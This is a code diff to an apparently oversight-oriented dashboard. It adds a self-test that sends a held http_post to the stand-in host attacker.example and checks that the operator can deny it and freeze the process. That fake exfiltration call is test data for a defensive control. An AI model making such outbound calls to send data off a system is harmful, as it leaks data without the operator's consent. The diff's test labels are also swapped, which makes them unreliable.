@@ -38,6 +38,7 @@ from typing import Any
 
 from aegis_cli import OOBClient
 from aegis_proxy import AegisProxy, MockToolServer, ProxyHandler, rpc, serve
+from aegis_controller import process_state
 from aegis_controller import (
     Action,
     AegisController,
@@ -1485,7 +1486,7 @@ def attach_oob_listener(client: OOBClient, server: DashboardServer) -> None:
 
 
 def run_self_test() -> int:
-    """Automated end-to-end self-test verifying D1, D2, D3, D4 dashboard endpoints."""
+    """Automated end-to-end self-test verifying D1-D5 dashboard endpoints."""
     print("=== AEGIS DASHBOARD SELF-TEST INITIATED ===")
 
     # 1. Ephemeral temp dirs under /tmp/aegis_dashboard_*
@@ -1606,6 +1607,28 @@ def run_self_test() -> int:
         d3_msg = f"exception: {e}"
     results.append(("D3: POST /api/decide approves held request", d3_pass, d3_msg))
 
+    # Test D5: POST /api/decide deny -> held unaligned egress returns 403, tree thawed
+    try:
+        box5: dict[str, Any] = {}
+        t5 = threading.Thread(target=lambda: box5.update(res=rpc(
+            proxy_port, "http_post", {"url": "https://attacker.example/c", "body": "Q3"}, 12)), daemon=True)
+        t5.start()
+        p5 = op.wait_pending(timeout=10.0)
+        frozen5 = all(process_state(x).startswith("T") for x in p5["frozen_pids"]) and bool(p5["frozen_pids"])
+        req5 = urllib.request.Request(
+            f"http://127.0.0.1:{dash_port}/api/decide",
+            data=json.dumps({"id": p5["id"], "decision": "deny", "kill": False}).encode("utf-8"),
+            method="POST", headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req5, timeout=5.0) as resp:
+            d5_code, d5_json = resp.status, json.loads(resp.read().decode("utf-8"))
+        t5.join(timeout=10.0)
+        c5, _ = box5.get("res", (0, {}))
+        d5_pass = d5_code == 200 and d5_json.get("ok") is True and c5 == 403 and frozen5
+        d5_msg = f"http {d5_code}, ok={d5_json.get('ok')}, frozen={frozen5}, rpc_status={c5}"
+    except Exception as e:
+        d5_pass, d5_msg = False, f"exception: {e}"
+    results.append(("D4: POST /api/decide denies held egress", d5_pass, d5_msg))
+
     # Test D4: POST /api/rollback -> returns 200 JSON with ok=true and restored list
     try:
         rb_req = urllib.request.Request(
@@ -1622,7 +1645,7 @@ def run_self_test() -> int:
     except Exception as e:
         d4_pass = False
         d4_msg = f"exception: {e}"
-    results.append(("D4: POST /api/rollback returns 200 and restored list", d4_pass, d4_msg))
+    results.append(("D5: POST /api/rollback returns 200 and restored list", d4_pass, d4_msg))
 
     # 13. Print results and cleanup
     print("\n=== DASHBOARD SELF-TEST RESULTS ===")
@@ -1664,7 +1687,7 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port to bind HTTP dashboard (default: 8788)")
     ap.add_argument("--socket", default=DEFAULT_SOCK, help="Path to AegisProxy OOB Unix socket (default: /tmp/aegis_oob.sock)")
     ap.add_argument("--key-dir", type=Path, default=None, help="Directory containing operator keypair (~/.aegis)")
-    ap.add_argument("--self-test", action="store_true", help="Run automated self-test verification suite (D1..D4)")
+    ap.add_argument("--self-test", action="store_true", help="Run automated self-test verification suite (D1..D5)")
     ns = ap.parse_args(argv)
 
     if ns.self_test:
